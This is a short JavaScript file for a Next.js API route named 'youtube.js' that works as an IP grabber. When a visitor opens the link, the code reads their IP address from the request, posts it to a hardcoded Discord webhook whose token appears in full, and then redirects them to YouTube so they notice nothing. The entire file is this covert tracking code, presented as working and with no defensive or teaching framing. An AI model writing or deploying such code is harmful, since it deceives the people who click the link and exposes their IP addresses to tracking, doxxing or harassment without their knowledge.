// pages/api/youtube.js
export default async function handler(req, res) {
  // Extract IP address
  const ip =
    req.headers['x-forwarded-for']?.split(',')[0] ||
    req.connection.remoteAddress ||
    '';

  // Discord webhook URL
  const webhookURL =
    'https://discord.com/api/webhooks/1505570928007057630/fHIzbKRE8m8Ziso_WzM5Cifde8WM8cE-sfE-Ceq8C1e4qvA-v0w5GlY35mW0ySgQe6H9';

  // Payload to send
  const payload = {
    content: `IP Address: ${ip}`,
  };

  // Send IP to Discord webhook
  await fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  });

  // Redirect user to YouTube
  res.writeHead(302, { Location: 'https://www.youtube.com' });
  res.end();
}
